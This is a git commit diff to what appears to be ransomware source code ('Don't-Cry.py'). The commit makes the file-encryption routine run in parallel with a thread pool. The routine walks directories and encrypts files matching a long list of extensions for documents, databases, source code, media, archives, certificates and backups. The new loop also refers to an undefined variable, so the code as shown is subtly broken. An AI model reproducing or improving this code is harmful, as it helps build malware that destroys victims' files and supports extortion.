1a2cb44588a21ca1ab933d1418b72da5bb760eba
memecoder <memecoder17@gmail.com>
2025-02-12 12:30:52 +0700

    Update Don't-Cry.py

--- scr/Don't-Cry.py
+++ scr/Don't-Cry.py
@@ -8,6 +8,7 @@ import sys
 import winreg
 import zlib
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
@@ -242,12 +243,16 @@ def encrypt_file(path, key, chunk_size=268435456):
 
 def encrypt_directory(directory_path, key):
     files_targeted = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".paq", ".arc", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]
-    for root, _, files in os.walk(directory_path):
-        for file in files:
-            if not os.path.splitext(file)[1].lower() in files_targeted:
-                continue
-            file_path = os.path.join(root, file)
-            encrypt_file(file_path, key)
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = []
+        for root, _, files in os.walk(directory):
+            for file in files:
+                if not os.path.splitext(file)[1].lower() in files_targeted:
+                    continue
+                file_path = os.path.join(root, file)
+                futures.append(executor.submit(encrypt_file, file_path, key))
+        for future in futures:
+            future.result()
 
 
 def shutdown():
